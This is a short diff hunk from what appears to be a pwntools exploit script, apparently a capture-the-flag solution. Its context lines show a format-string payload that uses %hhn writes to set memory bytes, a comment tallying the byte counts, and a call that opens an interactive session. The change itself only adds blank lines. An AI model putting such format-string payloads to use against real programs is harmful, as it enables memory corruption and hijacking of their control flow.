@@ -28,3 +28,7 @@ p.sendline(payload + b'%48c%2$hhn' + b'yeet%4$hhn' + b'%11c%3$hhn' + b'lol%5$hhn
 #               17      + 48 = 65        + 4 = 69       + 11 = 80       + 3 = 83
 
 p.interactive()
+
+
+
+
